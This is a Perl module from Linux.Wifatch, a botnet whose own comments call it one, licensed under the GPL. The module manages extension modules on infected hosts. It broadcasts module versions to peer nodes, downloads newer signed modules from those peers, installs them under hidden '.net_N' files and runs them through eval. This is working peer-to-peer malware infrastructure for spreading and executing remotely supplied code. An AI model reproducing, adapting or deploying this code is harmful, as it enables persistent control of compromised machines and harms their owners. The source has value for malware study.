#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package bn::xx;

# extension management

# 0 - malsigs.cbor
# 1 - seeds
# 2 - temp patches
# 3 - readme(?)
# 4 - backchannel
# 5 - improved upgrader
# 6 - extra modules, originally part of the main botnet, for restartless upgrading

our $I;    # current index during call
our @PL;
our @SEQ;
our $BOOT = 1;

unshift @INC, sub {
	return unless $_[1] =~ m%^xx(\d+)/(.*)$%;
	my ($i, $p) = ($1, $2);

	my $pl = $PL[$i]
		or die "require $_[1]: xx$i not loaded";

	my $src = $pl->($p)
		or die "require $_[1]: $p not in archive";

	bn::log "bn::xx require $_[1]";

	\$src;
};

sub call($$;@)
{
	my $i    = shift;
	my $name = shift;

	local $I = $i;
	my $pl = $PL[$I] or return;

	my @r = eval "package bn::xx$I;\n#line 0 'XX$I'\n" . $pl->("$name.pl");
	bn::log "bn::xx XX$i $name: $@\n" if $@;

	@r
}

use bn::auto sub => <<'END';
sub unload($);
my ($i) = @_;

if ($PL[$i] && !$BOOT) {
	bn::event::inject "unloadxx", $i, $PL[$i];
	bn::event::inject "unloadxx$i", $PL[$i];
	call $i, "unload";
}

undef $PL[$i];
undef $SEQ[$i];

END

use bn::auto sub => <<'END';
eval load_init($$);
my ($i, $flags) = @_;

# flags 0 - normal load
# flags 1 - on boot

bn::log "bn::xx XX$i $SEQ[$i] running";

call $i, "load", $flags;
bn::event::inject "loadxx$i", $PL[$i];
bn::event::inject "loadxx", $i, $PL[$i];

END

use bn::auto sub => <<'END';
eval load($);
my ($i) = @_;

if (my $pl = plpack::load "$::BASE/.net_$i") {
	my $verchk = sub {
		my ($type, $version) = @_;

		my $min = $pl->("verchk_min$type");
		my $max = $pl->("verchk_max$type");

		(!$min or $version >= $min)
			and (!$max or $version <= $max);
	};

	if ($verchk->(pl => $bn::PLVERSION) and $verchk->(bn => $bn::BNVERSION)) {
		unload $i;

		$PL[$i]  = $pl;
		$SEQ[$i] = $pl->("seq") + 0;

		bn::log "bn::xx XX$i $SEQ[$i] loading";

		load_init $i, 0 unless $BOOT;
	} else {
		bn::log "bn::xx XX$i $SEQ[$i] ver mismatch";

		Coro::AnyEvent::sleep 15;
	}
}

END

sub whisper_to($)
{
	bn::hpv::whisper $_[0], 2, pack "w*", @SEQ unless ::DEBUG;
}

# bn::xx::whisper_to $_ for keys %bn::hpv::as;

sub whisper(;$)
{
	whisper_to $_ for grep $_ ne $_[0], keys %bn::hpv::as;
}

our $QUEUE = new Coro::Channel;
our $MANAGER;

use bn::auto sub => <<'END';
eval init;
bn::func::async {
	if (opendir my $dir, $::BASE) {
		for (sort readdir $dir) {
			if (/^\.net_(\d+)$/) {
				load $1;
			}
		}
	}

	whisper;

	$MANAGER = bn::func::async {
		my $job;
		$job->() while $job = $QUEUE->get;
	};

	# additional delay
	Coro::AnyEvent::sleep 60 unless ::DEBUG;

	undef $BOOT;

	for (0 .. $#SEQ) {
		load_init $_, 1 if $PL[$_];
	}
};

END

bn::event::on hpv_add => \&whisper_to;

bn::event::on hpv_w2 => sub {
	my ($src, $data) = @_;

	$QUEUE->put(
		sub {
			my $delay;
			my @seq = eval {unpack "w*", $data};

			for my $i (0 .. $#seq) {
				if ($seq[$i] > $SEQ[$i]) {
					my $path = "$::BASE/.net_$i";

					if (bn::fileclient::download_from $src, 4, $i, "$path~") {
						if (bn::crypto::file_sigcheck "$path~", "xx$i") {
							my $pl = plpack::load "$path~";

							if ($pl->("seq") > $SEQ[$i]) {
								rename "$path~", $path;

								bn::log "bn::xx $src/$i: updated";
								bn::event::inject "updatexx$i", $pl;
								bn::event::inject "updatexx", $i, $pl;

								load $i, 0;

								# tell neighbour about new modules
								whisper $src;
								$delay = 1;

							} else {
								bn::log "bn::xx $src/$i: seq not higher";
							}
						} else {
							bn::log "bn::xx $src/$i: sigfail";
						}
					} else {
						bn::log "bn::xx $src/$i: unable download";
					}

					unlink "$path~";
				}
			}

			Coro::AnyEvent::sleep 5
				if $delay;
		});
};

1

